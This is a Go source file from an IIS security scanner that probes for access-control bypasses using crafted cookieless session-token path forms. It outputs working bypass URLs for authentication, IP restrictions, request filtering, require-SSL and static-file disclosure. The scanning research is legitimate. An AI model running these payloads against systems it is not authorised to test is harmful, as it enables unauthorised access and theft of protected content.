package shortscan

import (
	"fmt"
	"math/rand"
	"net/http"
	nurl "net/url"
	"regexp"
	"strings"
	"sync"

	"github.com/fatih/color"
	log "github.com/sirupsen/logrus"
)

// bypass.go implements --bypass-probe: a SINGLE read-only detector for the whole
// cookieless "managed-only" native access-control bypass family. H24/H34/H35 are
// not separate bugs — they are one primitive (a managed-only cookieless token
// survives the patched native filter and is only removed by System.Web after the
// RewritePath) hitting different NATIVE, <location>-scoped controls that all run
// BEFORE the rewrite. Confirmed in lab (research docs 23/24/26, doc 25 §3-5):
//
//	baseline 403.18  app-pool isolation           (needs a child application)   -> H24
//	baseline 403.503 ipSecurity IP allow/denylist                               -> H34
//	baseline 404.x   requestFiltering                                           -> H34
//	baseline 401.2   authentication (anon off / basic / windows) -> runs ANON   -> H35
//	baseline 403.4   require-SSL (sslFlags=Ssl) over plain HTTP                  -> H34-family
//
// The same primitive also reaches STATIC files (H37): when the app runs managed
// modules for every request (runAllManagedModulesForAllRequests=true, the MVC
// template default, or a no-preCondition module), the managed cookieless module
// removes the token for a static request too, so the StaticFile handler serves the
// file's bytes past the <location> control — a content disclosure, not just code exec.
//
// The single differential is identical in every case: the canonical cookieless
// form stays blocked/denied, the invalid lowercase-tag control never executes, but
// a managed-only form executes the guarded resource (and resolves it distinctly
// from a non-existent sibling). Only managed <authorization> (UrlAuthorization,
// post-rewrite) resists. The probe classifies the likely control by the baseline
// status and reports one candidate; the substatus/FREB pins the exact module.
//
// A standalone leading token (the above) preserves the raw path segment a
// <location> control keys on, so it CANNOT desync a control scoped to a specific
// FILE or DIRECTORY (research/52, H58) — only fusing the token INSIDE that exact
// segment does (dir-split for a directory, ext-split for a filename's extension).
// When the leading-token sweep finds nothing and the baseline is denied,
// probeSegmentSplitBypass sweeps that geometry as a fallback before giving up —
// closing a real false-negative this probe had for 12 days after H58 first
// proved it (research/findings/H74-file-scoped-location-bypass-bare-extsplit).

// --- cookieless token vocabulary (formerly apppool.go) --------------------
//
// apppoolVariant is one cookieless prefix form. "canonical" forms are recognised
// and removed by the native stage (and, across an application boundary, blocked by
// IIS 403.18); "managed-only" forms carry a '%' in the raw body or a mixed/encoded
// parenthesis so the native validator leaves them intact, yet System.Web adopts and
// removes them after one decode. "control-invalid" is a lowercase tag no stage
// should accept, guarding against "any parenthesised segment is ignored" false
// positives. The apppool* names are historical (the H24 app-pool probe came first);
// they now serve the whole unified family.
type apppoolVariant struct {
	label  string
	prefix string
	family string
}

const (
	familyCanonical = "canonical"
	familyManaged   = "managed-only"
	familyControl   = "control-invalid"
)

var apppoolVariants = []apppoolVariant{
	{"canonical", "/(S(X))", familyCanonical},
	{"encoded-symmetric", "/%28S(X)%29", familyCanonical},
	{"managed-only:tag", "/(%53(X))", familyManaged},
	{"managed-only:close", "/(S(X)%29", familyManaged},
	{"managed-only:open", "/%28S(X))", familyManaged},
	{"managed-only:value", "/(S(%58))", familyManaged},
	{"managed-only:tag-empty", "/(%53())", familyManaged},
	{"managed-only:close-empty", "/(S()%29", familyManaged},
	{"managed-only:open-empty", "/%28S())", familyManaged},
	{"managed-only:inner-open-empty", "/(S%28))", familyManaged},
	{"managed-only:inner-close-empty", "/(S(%29)", familyManaged},
	{"control:lowercase", "/(s(X))", familyControl},
}

// apppoolProbeStatus records the status of a variant against the real resource and
// against a non-existent sibling (to prove the form actually resolves the target
// rather than blanket-answering).
type apppoolProbeStatus struct {
	Real        int `json:"real"`
	Nonexistent int `json:"nonexistent"`
}

// apppoolExecuted reports whether a status means the request reached and ran the
// target resource (as opposed to being filtered/blocked or missing).
func apppoolExecuted(status int) bool {
	switch status {
	case http.StatusOK, http.StatusMovedPermanently, http.StatusFound,
		http.StatusInternalServerError:
		return true
	}
	return false
}

func randAlnum(n int) string {
	const cs = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = cs[rand.Intn(len(cs))]
	}
	return string(b)
}

func apppoolStatus(hc *http.Client, st *httpStats, url string) int {
	res, err := fetchStatus(hc, st, "GET", url)
	if err != nil {
		return 0
	}
	return res.StatusCode
}

// baselineDenied reports whether a direct-request status is a guard denial (formerly
// location.go). 401/403 are unambiguous (authentication / ipSecurity / require-SSL /
// authorization); a 404 is included because the paired non-existent-sibling control
// disambiguates a real requestFiltering (404.x) block from a plain "not found".
func baselineDenied(status int) bool {
	return status == http.StatusUnauthorized ||
		status == http.StatusForbidden ||
		status == http.StatusNotFound
}

type bypassResult struct {
	Type        string                        `json:"type"`
	Url         string                        `json:"url"`
	Baseline    int                           `json:"baseline"`
	Variants    map[string]apppoolProbeStatus `json:"variants"`
	Candidate   bool                          `json:"candidate"`
	Confidence  string                        `json:"confidence"`
	Variant     string                        `json:"variant,omitempty"`
	BypassForms []string                      `json:"bypassforms,omitempty"`
	Positions   []int                         `json:"positions,omitempty"`
	WorkingURL  string                        `json:"workingurl,omitempty"`
	Note        string                        `json:"note"`
}

// isStaticResource reports whether the resource path names a static file — an
// extension that is NOT mapped to a managed ASP.NET handler. It matters because a
// managed-only token that returns 200 on such a resource has DISCLOSED THE FILE'S
// CONTENT (H37), not merely executed code: the managed cookieless module removed the
// token for a static request (which happens when runAllManagedModulesForAllRequests
// is true — the ASP.NET MVC template default — or when a managed module with no
// preCondition forces the managed pipeline for all requests), then the StaticFile
// handler served the bytes past the <location> native control. Extensionless paths
// return false (likely an MVC route / managed endpoint, not a file).
func isStaticResource(path string) bool {
	p := path
	if i := strings.IndexAny(p, "?#"); i >= 0 {
		p = p[:i]
	}
	p = strings.TrimRight(p, "/")
	base := p[strings.LastIndex(p, "/")+1:]
	dot := strings.LastIndex(base, ".")
	if dot < 0 {
		return false
	}
	switch strings.ToLower(base[dot:]) {
	case ".aspx", ".asmx", ".ashx", ".svc", ".axd", ".asp",
		".cshtml", ".vbhtml", ".rem", ".soap", ".mvc":
		return false
	}
	return true
}

// executedCleanly reports unambiguous, successful execution (2xx/3xx) — used only
// for the row-label highlight. apppoolExecuted() still treats 5xx as "executed" for
// verdict purposes (a crash proves the request reached application code, which
// matters for detecting a crossing), but a 500 is not the same evidence as a clean
// 200 and must not be painted the same green as a real bypass.
func executedCleanly(status int) bool {
	return apppoolExecuted(status) && status < 500
}

// servedContent reports a real 2xx: this probe never fetches a response body, so a
// 2xx status is the only evidence that bytes were actually returned rather than a
// redirect notice. Deliberately narrower than executedCleanly (which also accepts
// 3xx) — used only to gate the H37 "content disclosed" relabel, where a bare 301/302
// carries no representation of the target resource and must never be reported as
// disclosure.
func servedContent(status int) bool {
	return status >= 200 && status < 300
}

// colorStatus renders an HTTP status code in a consistent palette across the tool:
// 2xx green (reached/executed), 3xx cyan (redirect), 401/403 yellow (auth-gated),
// other 4xx/5xx red (blocked/missing). All codes are 3 digits so columns stay aligned.
func colorStatus(code int) string {
	switch {
	case code >= 200 && code < 300:
		return color.HiGreenString("%d", code)
	case code >= 300 && code < 400:
		return color.HiCyanString("%d", code)
	case code == 401 || code == 403:
		return color.HiYellowString("%d", code)
	case code >= 400:
		return color.HiRedString("%d", code)
	default:
		return color.HiBlackString("%d", code)
	}
}

// pathSegments splits an escaped path into its non-empty segments.
func pathSegments(path string) []string {
	return strings.FieldsFunc(path, func(r rune) bool { return r == '/' })
}

// insertTokenSegment splices tokenSeg in as its OWN path segment before segment i.
func insertTokenSegment(segs []string, i int, tokenSeg string) string {
	out := make([]string, 0, len(segs)+1)
	out = append(out, segs[:i]...)
	out = append(out, tokenSeg)
	out = append(out, segs[i:]...)
	return "/" + strings.Join(out, "/")
}

// bypassTargets collects full resolved URLs discovered during a scan so that a
// directory-rooted --bypass-probe can enumerate first and then probe each endpoint.
var (
	bypassMu      sync.Mutex
	bypassTargets []string
)

func recordBypassTarget(u string) {
	bypassMu.Lock()
	bypassTargets = append(bypassTargets, u)
	bypassMu.Unlock()
}

func collectedBypassTargets() []string {
	bypassMu.Lock()
	defer bypassMu.Unlock()
	return append([]string(nil), bypassTargets...)
}

// urlPath returns the parsed path of a URL (or the raw string on parse failure).
func urlPath(raw string) string {
	if u, err := nurl.Parse(raw); err == nil {
		return u.Path
	}
	return raw
}

// urlHasResourcePath reports whether a URL names something below the host root, so
// it is worth probing the URL itself (a bare host / has nothing to probe).
func urlHasResourcePath(raw string) bool {
	p := urlPath(raw)
	return p != "" && p != "/"
}

// looksLikeFile reports whether the last path segment carries an extension, i.e. the
// URL names a resource rather than a directory to enumerate.
func looksLikeFile(raw string) bool {
	segs := pathSegments(urlPath(raw))
	if len(segs) == 0 {
		return false
	}
	return strings.Contains(segs[len(segs)-1], ".")
}

// probeBypassURLs probes each distinct URL directly (no scanning). It is the
// minimal entry the tests drive; the CLI mode (runBypassProbeMode) additionally
// enumerates directory URLs before probing what the scan resolves.
func probeBypassURLs(urls []string, hc *http.Client, st *httpStats) {
	seen := make(map[string]struct{}, len(urls))
	for _, raw := range urls {
		if _, ok := seen[raw]; ok {
			continue
		}
		seen[raw] = struct{}{}
		probeBypassURL(raw, hc, st)
	}
}

// runBypassProbeMode drives --bypass-probe (and the --apppool-probe/--location-probe
// aliases). URLs that already name a managed handler (…/x.aspx) are probed directly;
// directory URLs are scanned first so every endpoint the scan resolves is collected
// (recordBypassTarget) and then probed. --list feeds many URLs the same way.
func runBypassProbeMode(urls []string, hc *http.Client, st *httpStats) {
	seen := make(map[string]struct{})
	probe := func(u string) {
		if _, ok := seen[u]; ok {
			return
		}
		seen[u] = struct{}{}
		probeBypassURL(u, hc, st)
	}

	// Always probe each given URL that names a resource — including static files and
	// directories (they answer negative but the operator sees the baseline and forms,
	// never a bare "nothing to do").
	var toScan []string
	for _, u := range urls {
		if urlHasResourcePath(u) {
			probe(u)
		}
		if !looksLikeFile(u) {
			toScan = append(toScan, u) // directory-like: enumerate it for more endpoints
		}
	}

	// Then scan the directory-like URLs and probe every endpoint the scan resolves.
	if len(toScan) > 0 {
		wc, err := configureWordlists(args.Wordlists)
		if err != nil {
			log.WithFields(log.Fields{"err": err}).Fatal("Unable to configure wordlist")
		}
		statusCache = make(map[string]map[int]struct{})
		distanceCache = make(map[string]map[int]distances)
		checksumRegex = regexp.MustCompile("^.{1,2}[0-9A-F]{4}$")
		vulnerableCount = 0
		// Respect -i/--index: without this, combining --bypass-probe with -i silently
		// scanned the plain (hiddenSegments-blocked) directory instead of the
		// $INDEX_ALLOCATION/ADS form, resolving nothing and printing a false
		// "no managed-handler endpoints" negative.
		if args.Index {
			testIndexAllocations(toScan, hc, st, wc, markers{})
		} else {
			visited := make(map[string]struct{})
			Scan(toScan, hc, st, wc, markers{}, visited)
		}
		found := collectedBypassTargets()
		for _, t := range found {
			probe(t)
		}
		if len(found) == 0 && args.Output == "human" {
			printHuman(color.HiBlackString("bypass-probe: the scan resolved no managed-handler endpoints inside the directory. Point at a known managed URL (…/x.aspx) to probe it directly, or add --wordlist / --probe-candidates to recover endpoint names."))
		}
	}
}

// splitBypassHit records one confirmed H58 segment-split bypass: the token was
// fused INSIDE the segment a native <location> control keys on (dir-split for
// a directory, ext-split for the final filename's extension), desyncing the
// raw-URL match that control runs at BeginRequest — before the managed
// cookieless collapse reforms the real path. Distinct primitive from the
// standalone leading-token sweep in probeBypassURL: a leading token stays its
// own path segment, so it CANNOT desync a control keyed on a segment further
// down the path — that is exactly what H58 (research/52) found and what
// probeSegmentSplitBypass below exists to detect. Confirmed in lab against
// native authentication, ipSecurity and require-SSL, all FILE- or
// DIRECTORY-scoped, none needing fileExtensions or any other control
// involved (research/52; research/findings/H74-file-scoped-location-bypass-bare-extsplit).
type splitBypassHit struct {
	via, token, url string
	real, fake      int
}

// probeSegmentSplitBypass sweeps the H58 geometry: fuse a cookieless token
// INSIDE each directory segment (dir-split) and inside the final filename's
// extension (ext-split), and return the first split whose REAL resource
// resolves while a same-shape random sibling split the same way does not —
// the differential that rules out a catch-all responder. Only the two token
// spellings this primitive has actually been validated with (sourceTokens:
// canonical and managed-only) are tried — unlike the leading-token sweep,
// canonical already works here, because the desync is purely positional
// (which raw segment the token lands inside), not about native token-form
// recognition.
func probeSegmentSplitBypass(hc *http.Client, st *httpStats, base string, segs []string) *splitBypassHit {
	if len(segs) == 0 {
		return nil
	}
	file := segs[len(segs)-1]
	fakeExt := extOf(file)

	for di := 0; di < len(segs)-1; di++ {
		dir := segs[di]
		if len(dir) < 2 {
			continue // cannot split a 1-char segment
		}
		pre := segs[:di]
		post := segs[di+1:]
		splits := splitSegment(dir)
		if len(splits) > 3 {
			splits = splits[:3] // every split re-forms the identical path; a few are enough
		}
		fpost := append([]string(nil), post...)
		fpost[len(fpost)-1] = randAlnum(10) + fakeExt
		for _, hv := range splits {
			for _, t := range sourceTokens {
				real := apppoolStatus(hc, st, base+buildSourcePayload(pre, hv[0], hv[1], post, t.tok))
				if !apppoolExecuted(real) {
					continue
				}
				fake := apppoolStatus(hc, st, base+buildSourcePayload(pre, hv[0], hv[1], fpost, t.tok))
				if apppoolExecuted(fake) {
					continue // resolves everything -> not a real desync
				}
				return &splitBypassHit{
					via: fmt.Sprintf("dir-split(%q)", dir), token: t.label,
					url: base + buildSourcePayload(pre, hv[0], hv[1], post, t.tok), real: real, fake: fake,
				}
			}
		}
	}

	if dot := strings.LastIndexByte(file, '.'); dot >= 0 && dot < len(file)-1 {
		dirs := segs[:len(segs)-1]
		ext := file[dot:]
		for k := dot + 2; k < len(file); k++ { // split strictly inside the extension
			for _, t := range sourceTokens {
				real := apppoolStatus(hc, st, base+buildSourcePayload(dirs, file[:k], file[k:], nil, t.tok))
				if !apppoolExecuted(real) {
					continue
				}
				ff := randAlnum(10) + ext
				fk := len(ff) - (len(file) - k) // mirror the split offset from the end
				if fk < 1 || fk >= len(ff) {
					fk = len(ff) - 1
				}
				fake := apppoolStatus(hc, st, base+buildSourcePayload(dirs, ff[:fk], ff[fk:], nil, t.tok))
				if apppoolExecuted(fake) {
					continue
				}
				return &splitBypassHit{
					via: "ext-split", token: t.label,
					url: base + buildSourcePayload(dirs, file[:k], file[k:], nil, t.tok), real: real, fake: fake,
				}
			}
		}
	}
	return nil
}

// splitBypassClassify names the likely native control for a confirmed H58
// segment-split hit, mirroring bypassClassify's baseline-status switch.
func splitBypassClassify(baseline int) (confidence, variant, note string) {
	switch baseline {
	case http.StatusUnauthorized: // 401.2
		return "high", "native authentication bypass via segment-split (H58)",
			"baseline 401 (authentication) — the leading-token form alone stayed blocked (it preserves the raw segment the <location> keys on), but fusing the token INSIDE that segment desyncs the native BeginRequest match. NOTE: managed <authorization> is NOT bypassed (runs after the collapse)"
	case http.StatusForbidden: // 403.503 / 403.4 / 403.18 / 403
		return "high", "native access-control bypass via segment-split (H58)",
			"baseline 403 — likely ipSecurity (403.503) or require-SSL (403.4); the leading-token form alone stayed blocked, but fusing the token INSIDE the location-matched segment desyncs the raw-URL match — no fileExtensions or other control involved"
	case http.StatusNotFound: // 404.x
		return "high", "native requestFiltering bypass via segment-split (H58)",
			"baseline 404 — requestFiltering (confirm the 404.x substatus); the leading-token form alone stayed blocked, but fusing the token INSIDE the filtered segment desyncs the match"
	default:
		return "medium", "native access-control bypass via segment-split (H58)",
			"the leading-token form alone stayed blocked; fusing the token INSIDE the location-matched segment desyncs the raw-URL match"
	}
}

// posProbe holds the full variant matrix for the token inserted at one path position.
type posProbe struct {
	pos               int
	url               string // full URL with managed-only:tag spliced at this position
	variants          map[string]apppoolProbeStatus
	bypass            []string
	canonicalBlocked  bool
	canonicalExecuted bool
	controlExecuted   bool
	candidate         bool
}

func probeBypassURL(raw string, hc *http.Client, st *httpStats) {
	u, err := nurl.Parse(raw)
	if err != nil || u.Scheme == "" || u.Host == "" {
		log.WithField("url", raw).Error("bypass-probe: invalid URL")
		return
	}
	path := u.EscapedPath()
	if path == "" || path == "/" {
		log.WithField("url", raw).Warn("bypass-probe: point at a managed resource inside a restricted/child path, e.g. https://host/secure/Panel.aspx")
		return
	}
	base := u.Scheme + "://" + u.Host
	segs := pathSegments(path)
	if len(segs) == 0 {
		// A path of all separators ("//", "///", ...) passes the "" / "/" guard above
		// but FieldsFunc returns no segments, so fakeSegs[last] below would panic on
		// index -1. Treat it the same as the empty-path case instead of crashing the
		// whole --list/--bypass-probe run over one malformed URL.
		log.WithField("url", raw).Warn("bypass-probe: point at a managed resource inside a restricted/child path, e.g. https://host/secure/Panel.aspx")
		return
	}
	baseline := apppoolStatus(hc, st, base+path)

	// fakeSegs randomises the last segment so a form must resolve the REAL resource
	// (executes real, 404s the fake) to count as a bypass.
	fakeSegs := append([]string(nil), segs...)
	last := len(fakeSegs) - 1
	ext := ""
	if dot := strings.LastIndex(fakeSegs[last], "."); dot >= 0 {
		ext = fakeSegs[last][dot:]
	}
	fakeSegs[last] = randAlnum(10) + ext

	deniedBaseline := baselineDenied(baseline)
	executesBaseline := apppoolExecuted(baseline)

	// The token only blinds a <location> when it is spliced (as its own segment) at
	// or before the restricted segment: it must break the restricted prefix while
	// leaving the segments needed for routing/rewrite intact. For nested apps only a
	// specific insertion point works, so sweep the token before EVERY segment.
	probes := make([]posProbe, 0, len(segs))
	for i := 0; i < len(segs); i++ {
		pp := posProbe{pos: i, url: base + insertTokenSegment(segs, i, "(%53(X))"),
			variants: make(map[string]apppoolProbeStatus, len(apppoolVariants))}
		for _, v := range apppoolVariants {
			tok := strings.Trim(v.prefix, "/")
			s := apppoolProbeStatus{
				Real:        apppoolStatus(hc, st, base+insertTokenSegment(segs, i, tok)),
				Nonexistent: apppoolStatus(hc, st, base+insertTokenSegment(fakeSegs, i, tok)),
			}
			pp.variants[v.label] = s
			switch v.family {
			case familyManaged:
				if apppoolExecuted(s.Real) && s.Real != s.Nonexistent && !apppoolExecuted(s.Nonexistent) {
					pp.bypass = append(pp.bypass, v.label)
				}
			case familyCanonical:
				if s.Real == http.StatusForbidden {
					pp.canonicalBlocked = true
				}
				if apppoolExecuted(s.Real) {
					pp.canonicalExecuted = true
				}
			}
		}
		pp.controlExecuted = apppoolExecuted(pp.variants["control:lowercase"].Real)
		pp.candidate = len(pp.bypass) > 0 && !pp.controlExecuted && !pp.canonicalExecuted &&
			(deniedBaseline || (executesBaseline && pp.canonicalBlocked))
		probes = append(probes, pp)
	}

	// Primary = first working position (fallback to position 0 for the detail table).
	primary := probes[0]
	var winners []int
	for _, pp := range probes {
		if pp.candidate {
			winners = append(winners, pp.pos)
		}
	}
	if len(winners) > 0 {
		primary = probes[winners[0]]
	}
	candidate := len(winners) > 0

	// H58: a standalone leading token stays its OWN path segment, so it cannot
	// desync a native <location> control keyed on a segment further down the
	// path (a directory, or a filename's extension) — only fusing the token
	// INSIDE that exact segment does. Only worth sweeping when the leading-token
	// pass above found nothing, the baseline is actually denied (nothing to
	// desync otherwise), and — same false-positive guard the leading-token
	// candidacy check uses — neither the canonical nor the invalid-tag control
	// form already executed at the baseline position (if they do, the server
	// answers ANY parenthesised path the same way regardless of content, so a
	// split "hit" would be the same catch-all, not a real desync).
	var splitHit *splitBypassHit
	splitAttempted := false
	if !candidate && deniedBaseline && !primary.canonicalExecuted && !primary.controlExecuted {
		splitAttempted = true
		splitHit = probeSegmentSplitBypass(hc, st, base, segs)
		if splitHit != nil {
			candidate = true
		}
	}

	var confidence, variant, note string
	var bypassForms []string
	workingURL := ""
	if splitHit != nil {
		confidence, variant, note = splitBypassClassify(baseline)
		note = fmt.Sprintf("%s (fake sibling split the same way: %d, real: %d)", note, splitHit.fake, splitHit.real)
		bypassForms = []string{"segment-split:" + splitHit.via + "/" + splitHit.token}
		workingURL = splitHit.url
	} else {
		confidence, variant, note = bypassClassify(baseline, candidate, primary.canonicalBlocked, primary.canonicalExecuted, primary.controlExecuted, executesBaseline, primary.bypass)
		bypassForms = primary.bypass
		if candidate {
			workingURL = primary.url
		}
		if splitAttempted {
			note += " (segment-split/H58 geometry against the location-matched segment also tried, no bypass)"
		}
	}

	// H37: if the guarded resource is a static file and a bypass form served it
	// cleanly (2xx), the bypass DISCLOSED THE FILE'S CONTENT — a strictly higher
	// impact than running a known managed endpoint. Relabel so the operator sees it.
	if candidate && isStaticResource(path) {
		served := false
		if splitHit != nil {
			served = servedContent(splitHit.real)
		} else {
			for _, lbl := range primary.bypass {
				if servedContent(primary.variants[lbl].Real) {
					served = true
					break
				}
			}
		}
		if served {
			variant = "static-file content disclosure (H37) — " + variant
			note = "STATIC FILE: the bypass SERVED the file's bytes (content disclosed), not just ran code. " + note
		}
	}

	result := bypassResult{
		Type: "bypass", Url: base + path, Baseline: baseline, Variants: primary.variants,
		Candidate: candidate, Confidence: confidence, Variant: variant, BypassForms: bypassForms,
		Positions: winners, Note: note, WorkingURL: workingURL,
	}

	if args.Output == "human" {
		printHuman(fmt.Sprintf("%s %s (baseline %d)", color.New(color.FgWhite, color.Bold).Sprint("Bypass probe:"), color.HiWhiteString(result.Url), baseline))
		if len(segs) > 1 {
			for _, pp := range probes {
				tag := color.HiBlackString("no bypass")
				if pp.candidate {
					tag = color.HiRedString("CANDIDATE via %v", pp.bypass)
				}
				printHuman(fmt.Sprintf("    pos %d  %-46s %s", pp.pos, insertTokenSegment(segs, pp.pos, "(%53(X))"), tag))
			}
			printHuman("    " + color.HiBlackString("detail @ pos %d:", primary.pos))
		}
		for _, v := range apppoolVariants {
			s := primary.variants[v.label]
			full := base + insertTokenSegment(segs, primary.pos, strings.Trim(v.prefix, "/"))
			name := v.label
			if v.family == familyManaged && executedCleanly(s.Real) {
				name = color.HiGreenString("%-20s", v.label) // the forms that executed the resource
			} else {
				name = fmt.Sprintf("%-20s", v.label)
			}
			// fake first, real last — real sits next to the URL it belongs to,
			// since real is what answers "did this form reach the resource?".
			printHuman(fmt.Sprintf("    %s %-14s fake=%s real=%s   %s", name, v.prefix, colorStatus(s.Nonexistent), colorStatus(s.Real), color.HiGreenString(full)))
		}
		if splitHit != nil {
			printHuman(fmt.Sprintf("    %s %-14s fake=%s real=%s   %s", "segment-split", "("+splitHit.via+")", colorStatus(splitHit.fake), colorStatus(splitHit.real), color.HiGreenString(splitHit.url)))
		}
		if candidate {
			printHuman("    " + color.HiRedString("[candidate/%s] %s via %v — working URL: %s", confidence, variant, bypassForms, workingURL))
			printHuman("    " + color.HiRedString("    positions: %v — %s", winners, note))
		} else {
			printHuman("    " + color.HiBlackString("[negative] %s", note))
		}
	} else {
		printJSON(result)
	}
}

// bypassClassify names the likely native control from the baseline status. All are
// native and path-scoped (evaluated before the managed RewritePath), which is why a
// single managed-only token blinds every one of them.
func bypassClassify(baseline int, candidate, canonicalBlocked, canonicalExecuted, controlExecuted, executesBaseline bool, bypass []string) (confidence, variant, note string) {
	if candidate {
		switch baseline {
		case http.StatusUnauthorized: // 401.2
			return "high", "native authentication bypass (H35)",
				"baseline 401 (authentication) — the managed-only form runs the resource ANONYMOUSLY; canonical stays denied, invalid-tag control does not execute. NOTE: managed <authorization> is NOT bypassed (runs after RewritePath)"
		case http.StatusForbidden: // 403.503 / 403.4 / 403.18 / 403
			return "high", "native access-control bypass (H34-family)",
				"baseline 403 — likely ipSecurity (403.503), require-SSL (403.4) or app-pool (403.18); confirm the substatus with FREB. If it crosses an app/pool boundary, confirm the executing pool/identity (H24)"
		case http.StatusNotFound: // 404.x
			return "high", "native requestFiltering bypass (H34)",
				"baseline 404 — requestFiltering (confirm the 404.x substatus); canonical stays denied and the invalid-tag control does not execute"
		default: // baseline executes + canonical blocked -> app-pool crossing
			return "medium", "app-pool isolation bypass (H24)",
				"baseline executes but the canonical cross-app form is blocked (verify IIS 403.18) while a managed-only form runs the resource — confirm the crossed pool/identity with a page that echoes APP_POOL_ID"
		}
	}
	switch {
	case canonicalExecuted:
		return "none", "", "a canonical cookieless form also executed — no path-scoped control is evaluated before native cookieless removal here (or there is no boundary)"
	case controlExecuted:
		return "none", "", "the invalid lowercase-tag control also executed — server likely ignores any parenthesised segment (false-positive guard)"
	case len(bypass) == 0:
		return "none", "", "no managed-only form executed the resource while resolving it distinctly from a non-existent sibling"
	case executesBaseline && !canonicalBlocked:
		return "none", "", "a managed-only form executed but the direct baseline was not denied and no app-pool boundary was seen (canonical not blocked with 403) — not a bypass signature"
	default:
		return "none", "", "no clean denied-baseline / managed-only-executed differential"
	}
}
